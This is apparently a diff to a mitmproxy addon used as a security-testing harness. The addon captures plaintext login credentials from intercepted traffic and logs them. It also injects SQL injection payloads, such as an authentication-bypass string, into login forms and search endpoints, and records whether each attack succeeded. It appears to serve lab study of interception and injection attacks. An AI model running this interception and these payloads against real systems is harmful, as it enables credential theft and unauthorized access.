@@ -108,7 +108,7 @@ TEST_CASES = {
         "attack_goal": "access_bypass",
         "fields": {
             "username": "",
-            "password": "admin' OR '1'='1'#",
+            "password": "' OR '1' = '",
         },
         "expected_statuses": [302,200],
         "success_body_markers": ["Redirecting", "dashboard"],
@@ -311,9 +311,14 @@ def request(flow: http.HTTPFlow) -> None:
 
     # Credential interception metric:
     # Count readable credentials on POST /login.
-    # Do not modify this request, because normal login should still work.
     if method == "POST" and path == "/login":
+        # capture credentials if username/password are visible.
         capture_credentials(flow)
+
+        # Only run authentication-bypass SQLi when explicitly requested.
+        if flow.request.headers.get("X-SQLI-Test", "") == "login":
+            inject_form_fields(flow, "/login")
+
         return
 
     # SQLi target: data exfiltration through user search.
@@ -330,7 +335,8 @@ def request(flow: http.HTTPFlow) -> None:
     if method == "GET" and path.startswith("/find_company_drivers/"):
         inject_find_company_path(flow)
         return
-
+    
+    
 
 def evaluate_sqli_success(flow: http.HTTPFlow) -> bool:
     """
@@ -397,22 +403,44 @@ def response(flow: http.HTTPFlow) -> None:
 
     # Security event: credential interception.
     if event_type == "credential_capture":
-        credential_data = flow.metadata.get("credential_capture", {})
+        credential_data = flow.metadata.get("credential_capture")
 
-        event = {
-            "timestamp": utc_now(),
-            "event_type": "credential_capture",
-            "method": flow.request.method,
-            "path": flow.request.path,
-            "status_code": status_code,
-            "username": credential_data.get("username"),
-            "password": credential_data.get("password"),
-            "username_seen": credential_data.get("username_seen", False),
-            "password_seen": credential_data.get("password_seen", False),
-            "captured_credentials": credential_data.get("captured_credentials", False),
-        }
+        #logging credentials
+        if credential_data:
+            event = {
+                "timestamp": utc_now(),
+                "event_type": "credential_capture",
+                "method": flow.request.method,
+                "path": flow.request.path,
+                "status_code": status_code,
+                "username": credential_data.get("username"),
+                "password": credential_data.get("password"),
+                "username_seen": credential_data.get("username_seen", False),
+                "password_seen": credential_data.get("password_seen", False),
+                "captured_credentials": credential_data.get("captured_credentials", False),
+            }
 
-        write_jsonl(SECURITY_EVENTS_LOG, event)
+            write_jsonl(SECURITY_EVENTS_LOG, event)
+
+        #log injection attempt when given
+        if flow.metadata.get("sqli_modified", False):
+            success = evaluate_sqli_success(flow)
+
+            event = {
+                "timestamp": utc_now(),
+                "event_type": "sqli_attempt",
+                "method": flow.request.method,
+                "path": flow.request.path,
+                "status_code": status_code,
+                "endpoint": flow.metadata.get("sqli_endpoint"),
+                "test_number": flow.metadata.get("sqli_test_number"),
+                "test_name": flow.metadata.get("sqli_test_name"),
+                "attack_goal": flow.metadata.get("attack_goal"),
+                "success": success,
+                "changes": flow.metadata.get("sqli_changes", []),
+            }
+
+            write_jsonl(SECURITY_EVENTS_LOG, event)
 
     # Security event: SQL injection attempt.
     elif event_type == "sqli_attempt":
